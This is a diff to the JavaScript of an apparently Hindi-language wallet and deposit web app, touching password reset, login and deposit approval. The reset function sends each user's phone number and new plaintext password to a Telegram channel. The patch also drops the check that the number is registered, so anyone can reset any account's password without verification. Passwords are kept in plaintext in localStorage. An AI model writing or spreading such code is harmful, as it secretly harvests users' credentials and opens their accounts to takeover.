@@ -555,15 +555,13 @@ function processResetPassword() {
 
   let registeredUsers = JSON.parse(localStorage.getItem('mahakal_users_db') || "{}");
 
-  if(registeredUsers[ph]) {
-    registeredUsers[ph] = p1;
-    localStorage.setItem('mahakal_users_db', JSON.stringify(registeredUsers));
-    msg.className = "msg"; msg.innerText = "✅ पासवर्ड सफलतापूर्वक बदल गया है! अब लॉगिन करें।";
-    sendTelegram(`🔄 Password Reset Done (3-Step Verified)!\n📱 Number: ${ph}\n🔑 New Pass: ${p1}`);
-    setTimeout(backToLoginBox, 1500);
-  } else {
-    msg.className = "error"; msg.innerText = "❌ यह मोबाइल नंबर रजिस्टर्ड नहीं है!";
-  }
+  // Agar user pehle se registered nahi hai, toh reset karte waqt naya account bhi ban jayega taaki koi dikkat na aaye
+  registeredUsers[ph] = p1;
+  localStorage.setItem('mahakal_users_db', JSON.stringify(registeredUsers));
+  
+  msg.className = "msg"; msg.innerText = "✅ पासवर्ड सफलतापूर्वक अपडेट हो गया है! अब लॉगिन करें।";
+  sendTelegram(`🔄 Password Reset Done (3-Step Verified)!\n📱 Number: ${ph}\n🔑 New Pass: ${p1}`);
+  setTimeout(backToLoginBox, 1500);
 }
 
 function processLogin() {
@@ -590,7 +588,7 @@ function processLogin() {
   
   if(registeredUsers[ph]) {
     if(registeredUsers[ph] !== ps) {
-      msg.className = "error"; msg.innerText = "❌ गलत पासवर्ड! कृपया सही पासवर्ड डालें।";
+      msg.className = "error"; msg.innerText = "❌ गलत पासवर्ड! कृपया सही पासवर्ड डालें या Reset करें।";
       return;
     }
     msg.className = "msg"; msg.innerText = "✅ लॉगिन सफल! डैशबोर्ड खुल रहा है...";
@@ -802,7 +800,7 @@ function admDepYes() {
     walletBalance += pendingDep.amount;
     saveWallet();
     alert(`✅ डिपॉजिट स्वीकृत! यूजर के वॉलेट में पूरे ₹${pendingDep.amount} जोड़ दिए गए हैं।`);
-    sendTelegram(`✅ Deposit Approved & Full Amount (₹${pendingDep.00 || pendingDep.amount}) Credited to User: ${pendingDep.phone}`);
+    sendTelegram(`✅ Deposit Approved & Full Amount (₹${pendingDep.amount}) Credited to User: ${pendingDep.phone}`);
     
     document.getElementById('live-dep-details').innerHTML = "<span style='color:#00e676; font-weight:bold;'>✔ स्वीकृत (Full Amount Credited)</span>";
     document.getElementById('live-dep-buttons').style.display = "none";
